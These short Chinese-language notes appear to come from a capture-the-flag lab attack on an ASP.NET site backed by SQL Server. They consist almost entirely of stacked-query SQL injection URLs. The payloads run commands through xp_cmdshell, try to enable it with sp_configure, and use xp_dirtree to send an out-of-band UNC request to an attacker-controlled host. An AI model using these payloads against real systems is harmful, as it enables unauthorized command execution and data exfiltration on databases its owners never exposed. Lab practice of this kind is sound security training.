-常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令
-https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：
-http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed
-猜测是没有权限的问题，想到xp_dirtree外带数据：
-payload：
-http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-
 
 
 
